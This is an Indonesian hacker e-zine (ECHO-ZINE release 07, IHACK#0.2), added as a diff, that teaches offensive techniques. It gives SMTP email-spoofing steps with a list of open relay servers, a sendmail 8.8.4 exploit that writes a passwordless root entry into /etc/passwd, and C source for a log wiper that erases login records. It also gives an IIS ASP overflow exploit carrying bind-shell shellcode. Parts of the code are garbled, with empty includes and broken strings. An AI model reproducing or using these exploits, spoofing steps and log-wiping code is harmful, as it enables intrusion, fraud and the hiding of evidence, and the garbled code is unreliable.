@@ -1,0 +1,475 @@
+
+        ____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       07
+
+Author: basher13 |basher13@stardawn.net (www.stardawn.net)
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+
+/***************************************************************
+        ======   IHACK#0.2  =========
+       Author: basher13 | Email:basher13@stardawn.net
+       website:http://ihack.stardawn.net
+       Greetz:IHACK-Indonesian Hackers Team
+              DUncan silver,Abhisek Datta
+  ***************************************************************/
+
+
+
+	Chapter: 1.0
+		 +Mail spoofing
+		 +Koneksi melalui telnet
+		 +Windows telnet
+		 +Spoofing mailfrom
+                 +daftar anonymous mailserver
+
+
+	Chapter: 2.0
+		 +sendmail8.8.4 exploit
+		 +Menghapus sistem log
+		 +127.0.0.1
+		 +Windows 2000 Server Exploit
+
+
+                                           CHAPTER#1.0
+                                           -----------
++Mail spoofing
++Koneksi melalui telnet
++Windows telnet
++Spoofing mailfrom
++daftar anonymous mailserver
+
+
+Mail Spoofing
+-------------
+E-zine kali membahas tentang pengiriman email spoofing,banyak sudah artikel
+atau e-zine yang menjelaskan tentang spoofing tersebut.Ada baiknya jika IHACK
+membahas dan memberikan penjelasan lagi bagi yang ingin tahu soal mail spoofing
+.Sebelumnya anda pernah mendengar atau mendapatkan email kiriman dari
+web server anda sendiri atau dari webserver lainnya ,yang berbentuk 'fake'asli atau
+palsu.Atau anda ingin mengirimkan email dengan fbi.gov,nasa.com,dll,hal
+tersebut sangatlah mudah dan yang dibutuhkan untuk operasi tersebut hanyalah
+sebuah telnet(smtp)Simple Mail Transfer Protocol.
+
+Koneksi melalui telnet
+----------------------
+Berikut ringkasan pendek untuk pengiriman email spoffing;
+
+   * telnet>o webserver.com 80
+   * type: mail from: asalspoof@alamat.com
+   * type: rcpt to: korban@mail.com
+   * type: data
+   * type: Pesan anda
+   * type: .
+
+Windows telnet
+--------------
+ 
+Buka telnet melalui mesin win95:
+
+
+   * klik  start, dan pilih run
+   * type: telnet di dialog box
+   * tekan enter-a telnet client pop up
+   * klik di "terminal" menu
+   * pilih preferences
+   * pastikan "Enable local echo" telah dipilih
+   * klik "connect" menu
+   * klik "remote system"-a dialog box pop up
+   * enter alamat apa saja di dialog box (contoh: www.omnics.co.jp)
+   * gunakan port 25
+   * klik connect
+
+Spoofing mailfrom
+-----------------
+Setelah telnet dijalankan,ikuti perintah berikut ini;
+
+   * mail from: terserah@anda.com
+   * rcpt to: alamat email yang ingin anda kirimkan
+   * data
+   * pesan kamu
+   * .
+   * (enter 2x)
+
+
+Dimana saat telnet  berjalan ,ketik 'help' untuk mengetahui beberapa perintah telnet/mail
+daemon.
+Selamat Email spoofing anda telah terkirim !
+
+
+daftar anonymous mailserver
+--------------------------
+dibawah ini daftar dari beberapa mailserver diperlukan bisa untuk spoofing:
+
+
+zombie.com 
+nccn.net 
+telis.org
+cvo.oneworld.com
+www.marist.chi.il.us
+bi-node.zerberus.de
+underground.net
+alcor.unm.edu
+venus.earthlink.net
+mail.airmail.net
+redstone.army.mil
+pentagon.mil
+centerof.thesphere.com
+misl.mcp.com
+jeflin.tju.edu
+arl-mail-svc-1.compuserve.com
+alcor.unm.edu
+mail-server.dk-online.dk
+lonepeak.vii.com
+burger.letters.com
+aldus.northnet.org
+netspace.org
+mcl.ucsb.edu
+wam.umd.edu
+atlanta.com
+venus.earthlink.net
+urvax.urich.edu
+vax1.acs.jmu.edu
+loyola.edu
+brassie.golf.com
+quartz.ebay.gnn.com
+palette.wcupa.edu
+utrcgw.utc.com
+umassd.edu
+trilogy.usa.com
+corp-bbn.infoseek.com
+vaxa.stevens-tech.edu
+ativan.tiac.net
+miami.linkstar.com
+wheel.dcn.davis.ca.us
+kroner.ucdavis.edu
+ccshst01.cs.uoguelph.ca
+server.iadfw.net
+valley.net
+grove.ufl.edu
+cps1.starwell.com
+unix.newnorth.net
+mail2.sas.upenn.edu
+nss2.cc.lehigh.edu
+blackbird.afit.af.mil
+denise.dyess.af.mil
+cs1.langley.af.mil
+wpgate.hqpacaf.af.mil
+www.hickam.af.mil
+wpgate.misawa.af.mil
+guam.andersen.af.mil
+dgis.dtic.dla.mil
+www.acc.af.mil
+
+
+..kamu bisa menambahkan mailserver tersebut.
+
+
+
+
+
+
+
+
+
+
+
+
+                                                CHAPTER#2.0
+                                                -----------
+
++sendmail8.8.4 exploit
++Menghapus sistem log
++127.0.0.1
++Windows 2000 Server Exploit
+
+
+
+
+sendmail8.8.4 exploit
+---------------------
+anda sebelumnya harus mempunyai shell account di server tersebut.Exploit ini membuat link dari
+/etc/passwd  ke /var/tmp/dead.letter,berikut cara kerja sendmail exploit;
+
+
+   * ln /etc/passwd /var/tmp/dead.letter
+   * telnet target.host 25
+   * mail from: nonexsistent@not.an.actual.host.com
+   * rcpt to: nonexsistent@not.as.actual.host.com
+   * data
+   * lord::0:0:leet shit:/root:/bin/bash
+   * .
+   * quit
+
+
+B00m,selamat anda telah mengtelnet port 23 dan login sebagai lord,tanpa menggunakan password.Lord
+mempunyai privacy disini sebagai root.
+
+
+
+
+
+Menghapus sistem log
+--------------------
+Edit /etc/utmp, /usr/adm/wtmp dan /usr/adm/lastlog.Ini bukanlah sebuah text file dan tidak dapat
+diubah,program c dibawah ini dapat menghapus sistem log tersebut.
+
+
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+int f;
+
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+        while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                          bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                          lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                          write (f, &utmp_ent, sizeof (utmp_ent));
+                  }
+        close(f);
+  }
+}
+
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+
+        while(pos != -1L) {
+           lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+           if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+                pos = -1L;
+           } else {
+                if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                        bzero((char *)&utmp_ent,sizeof(struct utmp ));
+                        lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+                        write (f, &utmp_ent, sizeof (utmp_ent));
+                        pos = -1L;
+                } else pos += 1L;
+           }
+        }
+        close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+        if ((pwd=getpwnam(who))!=NULL) {
+
+           if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+                  lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+                  bzero((char *)&newll,sizeof( newll ));
+                  write(f, (char *)&newll, sizeof( newll ));
+                  close(f);
+           }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+           kill_lastlog(argv[1]);
+           kill_wtmp(argv[1]);
+           kill_utmp(argv[1]);
+           printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+
+
+...Gunakan program tersebut untuk pelajaran dan pengetahuan semata-mata.
+
+
+
+
+
+
+127.0.0.1
+---------
+angka atau nomer 127.0.0.1 merupakan loopback network,jika anda menggunakan telnet,ftp,smtp..dll
+angka tersebut berasal dari no ip asal mesin komputer pribadi anda.
+
+
+
+
+
+Windows 2000 Server Exploit
+---------------------------
+ASP overlow exploit berikut ini akan membuka port 1111 ,nantinya kamu dapat mengaksess ke targethost
+dan sang korban akan menerima pesan box di terminal screen menunjukkan bahwa AV(Access Violaion)
+telah error.Gunakan MS VC++ untuk mengkomplie code ini.
+
+
+#include "stdafx.h"
+#include 
+#include 
+#include 
+#include 
+#pragma comment (lib,"Ws2_32")
+
+int main(int argc, char* argv[])
+{
+	if(argc != 4)
+	{
+		printf("%s ip port aspfilepath\n\n",argv[0]);
+		printf(" ie. %s 127.0.0.1 80 /iisstart.asp\n",argv[0]);
+		return 0;
+	}
+	DWORD srcdata=0x01e2fb1c-4;//0x00457474; 
+	//alamat SHELLCODE
+	DWORD jmpaddr=0x00457494; //0x77ebf094;/ /0x01e6fcec; //"\x1c\xfb\xe6\x01"; //"\x0c\xfb\xe6\x01";
+	char* destIP=argv[1];
+	char* destFile=argv[3];
+	int webport=atoi(argv[2]);
+	char* pad="\xcc\xcc\xcc\xcc" "ADPA" "\x02\x02\x02\x02" "PADP"; //16 bytes
+	WSADATA ws;
+	SOCKET s;
+	long result=0;
+	if(WSAStartup(0x0101,&ws) != 0)
+	{
+		puts("WSAStartup() error");
+		return -1;
+	}
+	struct sockaddr_in addr;
+	addr.sin_family=AF_INET;
+	addr.sin_port=htons(webport);
+	addr.sin_addr.s_addr=inet_addr(destIP);
+	s=socket(AF_INET,SOCK_STREAM,0);
+	if(s==-1)
+	{
+		puts("Socket lagi error");
+		return -1;
+	}
+	if(connect(s,(struct sockaddr *)&addr,sizeof(addr)) == -1)
+	{
+		puts("Tidak dapat tersambung ke spesifikasi host");
+		return -1;
+	}
+	char buff[4096];
+	char* shellcode=
+	"\x55\x8b\xec\x33\xc0\xb0\xf0\xf7\xd8\x03\xe0\x8b\xfc\x33\xc9\x89"
+	"\x8d\x2c\xff\xff\xff\xb8\x6b\x65\x72\x6e\xab\xb8\x65\x6c\x33\x32"
+	"\xab\x32\xc0\xaa\xb8\x77\x73\x6f\x63\xab\xb8\x6b\x33\x32\x2e\xab"
+	"\x4f\x32\xc0\xaa\x8d\x7d\x80\xb8\x63\x6d\x64\x2e\xab\x32\xc0\x4f"
+	"\xaa\xb8\x23\x80\xe7\x77\x8d\x9d\x10\xff\xff\xff\x53\xff\xd0\x89"
+	"\x45\xfc\xb8\x23\x80\xe7\x77\x8d\x9d\x19\xff\xff\xff\x53\xff\xd0"
+	"\x89\x45\xf8\xbb\x4b\x56\xe7\x77\x6a\x47\xff\x75\xfc\xff\xd3\x89"
+	"\x45\xf4\x6a\x48\xff\x75\xfc\xff\xd3\x89\x45\xf0\x33\xf6\x66\xbe"
+	"\x1d\x02\x56\xff\x75\xfc\xff\xd3\x89\x45\xec\x66\xbe\x3e\x02\x56"
+	"\xff\x75\xfc\xff\xd3\x89\x45\xe8\x66\xbe\x0f\x03\x56\xff\x75\xfc"
+	"\xff\xd3\x89\x45\xe4\x66\xbe\x9d\x01\x56\xff\x75\xfc\xff\xd3\x89"
+	"\x85\x34\xff\xff\xff\x66\xbe\xc4\x02\x56\xff\x75\xfc\xff\xd3\x89"
+	"\x85\x28\xff\xff\xff\x33\xc0\xb0\x8d\x50\xff\x75\xfc\xff\xd3\x89"
+	"\x85\x18\xff\xff\xff\x6a\x73\xff\x75\xf8\xff\xd3\x89\x45\xe0\x6a"
+	"\x17\xff\x75\xf8\xff\xd3\x89\x45\xdc\x6a\x02\xff\x75\xf8\xff\xd3"
+	"\x89\x45\xd8\x33\xc0\xb0\x0e\x48\x50\xff\x75\xf8\xff\xd3\x89\x45"
+	"\xd4\x6a\x01\xff\x75\xf8\xff\xd3\x89\x45\xd0\x6a\x13\xff\x75\xf8"
+	"\xff\xd3\x89\x45\xcc\x6a\x10\xff\x75\xf8\xff\xd3\x89\x45\xc8\x6a"
+	"\x03\xff\x75\xf8\xff\xd3\x89\x85\x1c\xff\xff\xff\x8d\x7d\xa0\x32"
+	"\xe4\xb0\x02\x66\xab\x66\xb8\x04\x57\x66\xab\x33\xc0\xab\xf7\xd0"
+	"\xab\xab\x8d\x7d\x8c\x33\xc0\xb0\x0e\xfe\xc8\xfe\xc8\xab\x33\xc0"
+	"\xab\x40\xab\x8d\x45\xb0\x50\x33\xc0\x66\xb8\x01\x01\x50\xff\x55"
+	"\xe0\x33\xc0\x50\x6a\x01\x6a\x02\xff\x55\xdc\x89\x45\xc4\x6a\x10"
+	"\x8d\x45\xa0\x50\xff\x75\xc4\xff\x55\xd8\x6a\x01\xff\x75\xc4\xff"
+	"\x55\xd4\x33\xc0\x50\x50\xff\x75\xc4\xff\x55\xd0\x89\x45\xc0\x33"
+	"\xff\x57\x8d\x45\x8c\x50\x8d\x45\x98\x50\x8d\x45\x9c\x50\xff\x55"
+	"\xf4\x33\xff\x57\x8d\x45\x8c\x50\x8d\x45\x90\x50\x8d\x45\x94\x50"
+	"\xff\x55\xf4\xfc\x8d\xbd\x38\xff\xff\xff\x33\xc9\xb1\x44\x32\xc0"
+	"\xf3\xaa\x8d\xbd\x38\xff\xff\xff\x33\xc0\x66\xb8\x01\x01\x89\x47"
+	"\x2c\x8b\x45\x94\x89\x47\x38\x8b\x45\x98\x89\x47\x40\x89\x47\x3c"
+	"\xb8\xf0\xff\xff\xff\x33\xdb\x03\xe0\x8b\xc4\x50\x8d\x85\x38\xff"
+	"\xff\xff\x50\x53\x53\x53\x6a\x01\x53\x53\x8d\x4d\x80\x51\x53\xff"
+	"\x55\xf0\x33\xc0\xb4\x04\x50\x6a\x40\xff\x95\x34\xff\xff\xff\x89"
+	"\x85\x30\xff\xff\xff\x90\x33\xdb\x53\x8d\x85\x2c\xff\xff\xff\x50"
+	"\x53\x53\x53\xff\x75\x9c\xff\x55\xec\x8b\x85\x2c\xff\xff\xff\x85"
+	"\xc0\x74\x49\x33\xdb\x53\xb7\x04\x8d\x85\x2c\xff\xff\xff\x50\x53"
+	"\xff\xb5\x30\xff\xff\xff\xff\x75\x9c\xff\x55\xe8\x85\xc0\x74\x6d"
+	"\x33\xc0\x50\xff\xb5\x2c\xff\xff\xff\xff\xb5\x30\xff\xff\xff\xff"
+	"\x75\xc0\xff\x55\xcc\x83\xf8\xff\x74\x53\xeb\x10\x90\x90\x90\x90"
+	"\x90\x90\x6a\x32\xff\x95\x28\xff\xff\xff\xeb\x99\x90\x90\x33\xc0"
+	"\x50\xb4\x04\x50\xff\xb5\x30\xff\xff\xff\xff\x75\xc0\xff\x55\xc8"
+	"\x83\xf8\xff\x74\x28\x89\x85\x2c\xff\xff\xff\x33\xc0\x50\x8d\x85"
+	"\x2c\xff\xff\xff\x50\xff\xb5\x2c\xff\xff\xff\xff\xb5\x30\xff\xff"
+	"\xff\xff\x75\x90\xff\x55\xe4\x85\xc0\x74\x02\xeb\xb4\xff\x75\xc4"
+	"\xff\x95\x1c\xff\xff\xff\xff\x75\xc0\xff\x95\x1c\xff\xff\xff\x6a"
+	"\xff\xff\x95\x18\xff\xff\xff";
+	
+	char* s1="POST ";// HTTP/1.1\r\n";
+	char* s2="Accept: */*\r\n";
+	char* s4="Content-Type: application/x-www-
+	form-urlencoded\r\n";
+	char* s5="Transfer-Encoding: 
+	chunked\r\n\r\n";
+	char* sc="0\r\n\r\n\r\n";
+	char shellcodebuff[1024*8];
+	memset(shellcodebuff,0x90,sizeof(shellcodebuff));
+	memcpy(&shellcodebuff[sizeof(shellcodebuff) - strlen(shellcode) - 1],shellcode,strlen(shellcode));
+	shellcodebuff[sizeof(shellcodebuff)-1] = 0;
+	char sendbuff[1024*16];
+	memset(sendbuff,0,1024*16);
+	sprintf(sendbuff,"%s%s?%s HTTP/1.1\r\n%sHost: %s\r\n%s%s10\r\n%s\r\n4\r\nAAAA\r\n4\r\nBBBB\r\n%s", s1, destFile, shellcodebuff, s2, destIP, s4,s 5, pad/*,srcdata,jmpaddr*/, sc);
+	int sendlen=strlen(sendbuff);
+	*(DWORD *)strstr(sendbuff,"BBBB") = jmpaddr;
+	*(DWORD *)strstr(sendbuff,"AAAA") = srcdata;
+	result=send(s,sendbuff,sendlen,0);
+	if(result == -1 )
+	{
+		puts("Kirim shellcode error!");
+		return -1;
+	}
+	memset(buff,0,4096);
+	result=recv(s,buff,sizeof(buff),0);
+	if(strstr(buff,"") != NULL)
+	{
+		shutdown(s,0);
+		closesocket(s);
+		puts("Kirim shellcode error!Coba lagi!");
+		return -1;
+	}
+	shutdown(s,0);
+	closesocket(s);
+	printf("\nGunakan untuk terhubung ke host\n",destIP);
+	puts("Anda tidak dapat terhubung ke host,coba lagi!");
+	return 0;
+}
+ 
+
+
+                                                    -- eof--
+
